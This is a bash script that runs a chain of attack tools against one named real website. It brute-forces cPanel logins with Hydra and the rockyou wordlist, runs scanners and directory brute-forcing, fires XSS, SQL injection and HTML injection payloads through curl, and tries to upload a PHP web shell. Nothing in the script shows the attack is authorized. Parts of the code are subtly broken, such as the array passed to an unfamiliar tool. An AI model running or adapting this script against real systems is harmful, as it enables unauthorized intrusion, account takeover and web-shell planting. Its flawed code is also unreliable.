#!/bin/bash
#--------------------------------------------------------------------
# Define the target URL
TARGET_URL="https://bytecapsule.io"
#--------------------------------------------------------------------
# Wordlist and filenames
USERLIST="user.txt"
PASSLIST="rockyou.txt"
PAYLOAD_FILE="xss_payloads.txt"
SQL_PAYLOADS=("OR 1=1--" "OR 'a'='a'" "OR \"x\"=\"x\"")
#--------------------------------------------------------------------
# Function to run Hydra for brute force on cPanel login
run_hydra() {
    echo "[*] Running Hydra for cPanel brute force..."
    hydra -L $USERLIST -P $PASSLIST $TARGET_URL:2083 http-get
}
#--------------------------------------------------------------------
# Function to run Nikto scan for web vulnerabilities
run_nikto() {
    echo "[*] Running Nikto for common vulnerabilities..."
    nikto -h $TARGET_URL
}
#--------------------------------------------------------------------
# Function to run HTTPx for active web probing
run_httpx() {
    echo "[*] Running HTTPx for active probing..."
    httpx -u $TARGET_URL -t 50 -o httpx_results.txt
}
#--------------------------------------------------------------------
# Function to run Katana for modular vulnerability checks
run_katana() {
    echo "[*] Running Katana for multiple vulnerability checks..."
    katana -u $TARGET_URL -t 50
}

# Function to run Nukile for SQL injection and web vulnerabilities
run_nukile() {
    echo "[*] Running Nukile for SQL injection and other vulnerabilities..."
    nukile -u $TARGET_URL -p $SQL_PAYLOADS
}

# Function to run CORScanner for CORS vulnerabilities
run_corscanner() {
    echo "[*] Running CORScanner for Cross-Origin Resource Sharing vulnerabilities..."
    corscanner -u $TARGET_URL
}

# Function to run Dirsearch for directory brute forcing
run_dirsearch() {
    echo "[*] Running Dirsearch for directory traversal..."
    python3 dirsearch.py -u $TARGET_URL --recursive --threads 10
}

# Function to run XSS testing with a list of payloads
run_xss() {
    echo "[*] Running XSS tests..."
    payloads=("<script>alert('XSS')</script>" "<img src=x onerror=alert('XSS')>" "<body onload=alert('XSS')>")
    for payload in "${payloads[@]}"
    do
        response=$(curl -s "$TARGET_URL?input=$payload")
        if [[ $response == *"$payload"* ]]; then
            echo "[*] XSS vulnerability found with payload: $payload"
        fi
    done
}

# Function to run SQL Injection tests
run_sql_injection() {
    echo "[*] Running SQL Injection tests..."
    for payload in "${SQL_PAYLOADS[@]}"
    do
        response=$(curl -s "$TARGET_URL?input=$payload")
        if [[ $response == *"error"* ]]; then
            echo "[*] SQL Injection vulnerability found with payload: $payload"
        fi
    done
}

# Function to run HTML Injection testing
run_html_injection() {
    echo "[*] Running HTML Injection tests..."
    payloads=("<div><h1>HTML Injection</h1></div>" "<iframe src='javascript:alert(1)'></iframe>")
    for payload in "${payloads[@]}"
    do
        response=$(curl -s "$TARGET_URL?input=$payload")
        if [[ $response == *"$payload"* ]]; then
            echo "[*] HTML Injection vulnerability found with payload: $payload"
        fi
    done
}

# Function to test File Upload vulnerability (upload shell)
run_file_upload() {
    echo "[*] Testing File Upload vulnerability..."
    response=$(curl -s -X POST -F "file=@shell.php" "$TARGET_URL/upload")
    if [[ $response == *"shell.php"* ]]; then
        echo "[*] File Upload vulnerability found!"
    fi
}


# Run all tests in sequence
echo "[*] Starting vulnerability scan on $TARGET_URL"

run_hydra
run_nikto
run_httpx
run_katana
run_nukile
run_corscanner
run_dirsearch
run_xss
run_sql_injection
run_html_injection
run_file_upload

echo "[*] Vulnerability testing completed."


